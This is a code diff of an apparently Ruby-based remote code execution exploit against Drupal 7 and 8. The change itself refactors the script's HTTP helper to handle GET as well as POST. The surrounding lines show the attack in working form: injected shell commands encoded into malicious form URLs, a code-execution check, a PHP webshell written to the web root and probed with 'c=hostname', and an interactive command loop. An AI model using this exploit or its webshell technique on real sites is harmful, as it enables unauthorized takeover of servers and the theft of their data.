@@ -35,10 +35,10 @@ bashcmd = "echo " + Base64.strict_encode64(bashcmd) + " | base64 -d"
 # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 
 
-# Function http_post <url> [post]
-def http_post(url, payload="")
+# Function http_request <url> [type] [data]
+def http_request(url, type="post", payload="")
   uri = URI(url)
-  request = Net::HTTP::Post.new(uri.request_uri)
+  request = type =~ /get/? Net::HTTP::Get.new(uri.request_uri) : Net::HTTP::Post.new(uri.request_uri)
   request.initialize_http_header({"User-Agent" => $useragent})
   request.body = payload
   return $http.request(request)
@@ -73,8 +73,8 @@ def gen_evil_url(evil, feedback=true)
   end
 
   # Drupal v7 needs an extra value from a form
-  if $drupalverion.start_with?('7')
-    response = http_post(url, payload)
+  if $drupalverion.start_with?("7")
+    response = http_request(url, "post", payload)
 
     form_build_id = response.body.match(/input type="hidden" name="form_build_id" value="(.*)"/).to_s().slice(/value="(.*)"/, 1).to_s.strip
     puts "[!] WARNING: Didn't detect form_build_id" if form_build_id.empty?
@@ -152,7 +152,7 @@ url = [
 # Check all
 url.each do|uri|
   # Check response
-  response = http_post(uri)
+  response = http_request(uri, "get")
 
   if response.code == "200"
     puts "[+] Found  : #{uri} (#{response.code})"
@@ -201,7 +201,7 @@ puts "[*] Testing: Code Execution"
 # Generate a random string to see if we can echo it
 random = (0...8).map { (65 + rand(26)).chr }.join
 url, payload = gen_evil_url("echo #{random}")
-response = http_post(url, payload)
+response = http_request(url, "post", payload)
 if response.code == "200" and not response.body.empty?
   #result = JSON.pretty_generate(JSON[response.body])
   result = $drupalverion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
@@ -237,7 +237,7 @@ paths.each do|path|
   # Generate evil URLs
   url, payload = gen_evil_url(cmd)
   # Make the request
-  response = http_post(url, payload)
+  response = http_request(url, "post", payload)
   # Check result
   if response.code == "200" and not response.body.empty?
     # Feedback
@@ -246,7 +246,7 @@ paths.each do|path|
     puts "[+] Result : #{result}"
 
     # Test to see if backdoor is there (if we managed to write it)
-    response = http_post("#{$target}#{webshellpath}", "c=hostname")
+    response = http_request("#{$target}#{webshellpath}", "post", "c=hostname")
     if response.code == "200" and not response.body.empty?
       puts "[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!"
       break
@@ -293,11 +293,11 @@ loop do
   # If PHP shell
   if webshellpath
     # Send request
-    result = http_post("#{$target}#{webshell}", "c=#{command}").body
+    result = http_request("#{$target}#{webshell}", "post", "c=#{command}").body
   # Direct commands
   else
     url, payload = gen_evil_url(command, false)
-    response = http_post(url, payload)
+    response = http_request(url, "post", payload)
     if response.code == "200" and not response.body.empty?
       result = $drupalverion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
     end
